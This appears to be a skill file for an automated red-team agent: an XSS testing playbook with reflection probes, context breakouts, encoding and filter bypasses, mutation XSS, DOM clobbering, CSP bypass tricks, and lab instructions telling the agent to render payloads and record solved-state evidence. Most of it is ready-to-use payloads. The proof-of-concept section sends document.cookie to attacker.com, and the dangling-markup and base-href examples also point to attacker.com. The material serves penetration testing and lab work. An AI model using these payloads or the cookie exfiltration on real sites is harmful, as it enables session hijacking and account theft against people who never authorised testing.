---
name: xss-testing
description: Detect and exploit cross-site scripting vulnerabilities in web applications
origin: RedteamOpencode
---

# XSS Testing

## When to Activate

- User input reflected in responses (search, errors, profiles)
- DOM manipulation from URL fragments, query params, postMessage
- Rich text editors, comment systems, stored user content

## Types

| Type | Persistence |
|------|-------------|
| Reflected | None — requires victim click |
| Stored | Persistent — triggers on page view |
| DOM-based | Client-side JS processes input unsafely |

## Detection

### 1. Probe for Reflection
```
xss<test>"'`;(){}          # Canary to find reflection points
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
For each param: submit canary, search entire HTML source, note every location, determine context.

### 2. Context Analysis

| Context | Example | Breakout |
|---------|---------|----------|
| HTML body | `<p>INPUT</p>` | Inject tags directly |
| Attribute | `value="INPUT"` | Close attr, add event handler |
| JS string | `var x = "INPUT"` | Close string, inject code |
| JS template | `` `${INPUT}` `` | `${alert(1)}` |
| URL/href | `href="INPUT"` | `javascript:alert(1)` |
| HTML comment | `<!-- INPUT -->` | `--><script>alert(1)</script>` |

## Context-Specific Payloads

### HTML Body
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
```

### Attribute
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
"><script>alert(1)</script>
```

### JavaScript
```javascript
";alert(1)//    ';alert(1)//    \';alert(1)//
-alert(1)-      ${alert(document.domain)}
```

### URL/href
```
javascript:alert(document.domain)
```

## Filter Bypass

### Tag/Keyword Blocked
```html
<ScRiPt>alert(1)</sCrIpT>                    # Case variation
<img src=x onerror=alert(1)>                  # Alt tags if <script> blocked
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
```

### Encoding Bypasses
```
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;  # HTML entity
%3Cscript%3Ealert(1)%3C%2Fscript%3E              # URL encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E     # Double URL encoding
&#0000060script&#0000062alert(1)&#0000060/script&#0000062  # Decimal entity, no semicolon, leading zeros
+ADw-script+AD4-alert(1)+ADw-/script+AD4-          # UTF-7 (only if charset negotiable/missing meta charset)
\u0061lert(1)                                      # Unicode escape (JS)
```

### Keyword Bypass
```html
confirm(1)  prompt(1)  eval('al'+'ert(1)')  setTimeout('alert(1)',0)
window['alert'](1)  [].constructor.constructor('alert(1)')()
alert`1`            # Backtick call
onerror=alert;throw 1  # Parentheses bypass
```

### Sanitizer Bypass (self-reassembling payload)
When a single global `replace` strips `<tag` + the following non-word run + one word char, make the removed span straddle a duplicated character so the survivors reassemble:
```html
<<a>iiframe src="javascript:alert(`xss`)">   # -> <iframe src="javascript:alert(`xss`)">
<<a>sscript>alert(`xss`)</script>           # -> <script>alert(`xss`)</script>
```
The leading `<` is skipped (next char is `<`, not a word char), the `<a>i` / `<a>s` span is consumed, and nothing after it matches.

### Mutation XSS (mXSS)
Sanitizer parses input once, serializes, then the browser re-parses the serialized DOM differently — the payload "mutates" into something dangerous only after the sanitizer already approved it. Test against DOMPurify/innerHTML-based sanitizers:
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><p><style><img src=1 onerror=alert(1)></style></p></svg>
<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
<form><math><mtext></form><form><mglyph><style></math><img src=1 onerror=alert(1)>
```
Confirm by round-tripping the payload through the target's actual sanitizer (client-side JS if accessible) rather than assuming — mXSS behavior is version/browser-parser dependent.

### DOM Clobbering
When a script reads a global/property before it's assigned (`var x = x || defaultConfig`, or references `document.getElementById('config')` result as if it were an object), named HTML elements can "clobber" that lookup:
```html
<a id=config></a>
<a id=config name=innerHTML href="javascript:alert(1)"></a>
<form id=x><input id=y name=z></form>  <!-- window.x.y / window.x.z resolve to elements -->
```
Useful for polluting `window.__proto__`-adjacent lookups or config objects into a state that flows into an existing `eval`/`innerHTML` sink elsewhere in the app.

### CSP Bypass Indicators
Check header for: unsafe-inline, unsafe-eval, wildcard sources, JSONP endpoints, CDN with user content.

### CSP Bypass Techniques
- **JSONP/Angular callback abuse**: if an allowed `script-src` host serves a JSONP endpoint or hosts old AngularJS, load it and pivot: `<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>` or an AngularJS sandbox-escape payload (`{{constructor.constructor('alert(1)')()}}`) if `ng-app`/`ng-csp` scripts are on an allow-listed origin.
- **Dangling markup injection** (when script execution is blocked but HTML injection isn't): exfiltrate data via an unterminated attribute that swallows subsequent markup into a request to an attacker origin: `<img src='https://attacker.com/leak?` — the browser keeps consuming markup as the `src` value until the next quote.
- **strict-dynamic + nonce leak**: if a nonce is reused across responses or leaks into a reflected context (view-source, error page, cached response), replay it: `<script nonce="LEAKED_NONCE">alert(1)</script>`.
- **base-uri missing**: if CSP lacks `base-uri 'self'` and allows `unsafe-inline` for some directive, inject `<base href="https://attacker.com/">` to hijack all relative script/resource paths.
- **Trusted Types bypass**: if `require-trusted-types-for 'script'` is set but a default policy exists (`TrustedTypes.createPolicy('default', ...)`) with a permissive `createHTML`, feed the sink through the default policy instead of `innerHTML` directly.

### CSP Header Injection
When a user-controlled value is interpolated into the emitted CSP directive (for example a profile-image URL concatenated into `img-src`), inject a second, permissive directive through the reflected value:
```
https://example.com/100.png; script-src 'unsafe-inline'
```
Confirm the emitted header now carries the injected directive before combining it with a script payload. A second `script-src 'unsafe-inline'` in the response header is the bypass evidence.

## DOM-Based XSS

Sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage`
Sinks: `innerHTML`, `document.write`, `eval`, `setTimeout`, `element.src/href`, `jQuery.html()/$()`

```
https://target.com/page#<img src=x onerror=alert(1)>
targetWindow.postMessage('<img src=x onerror=alert(1)>','*')
```

### Lab objective recall contract

When the target is a local lab and the active profile (`lab-profile.json`) lists client-side objectives, do not close XSS-capable surfaces with API-only probes. Execute one bounded browser-flow pass for the canonical client-side triggers named in the profile's `recall_branches`, then run `python3 ./scripts/lab_objective.py snapshot "$DIR"` (or fetch the objective source) for solved-state evidence before marking the case done.

Minimum browser-flow payload set:
- DOM/hash-route XSS: render the search/dynamic route with URL/hash payloads such as `#<iframe src="javascript:alert(1)">`, `<img src=x onerror=alert(1)>`, and their percent-encoded equivalents that exercise client-side route/query decoding.
- Solved-state sensitivity: observing a browser alert is not enough if the objective source still reports the XSS objective as unsolved. Requeue the exact payload plus a fresh snapshot rather than closing on generic "alert executed" evidence; some variants execute without satisfying the trigger.
- Reflected/API-only XSS: probe the reflected parameter and then render the page that consumes the response; do not stop at a raw JSON reflection check.
- Stored/user-content XSS: after feedback/comment/upload writes, navigate to the exact consumer view that renders the stored value and look for execution or safe escaping.
- When the profile lists a zero/edge-value business objective tied to a form, include that client/API path too.

If any of those route/payload families has not been browser-rendered, return `REQUEUE` with a concrete `dynamic_render` or `form` follow-up instead of `DONE STAGE=exhausted`. This protects recall for DOM XSS, API-only XSS, encoding, and reflected-XSS classes that API-only triage otherwise misses.

## Proof of Concept (demonstrate real impact)
```javascript
alert(document.domain)                                    // Execution context
fetch('https://attacker.com/log?c='+document.cookie)      // Cookie theft
new Image().src='https://attacker.com/steal?c='+document.cookie  // Session hijack
```

## Stored XSS Checklist

1. Test all persisted input fields (profiles, comments, messages, file names)
2. Navigate to every page where stored data displays
3. Test file upload names: `"><img src=x onerror=alert(1)>.jpg`
4. Test metadata: EXIF data, document properties
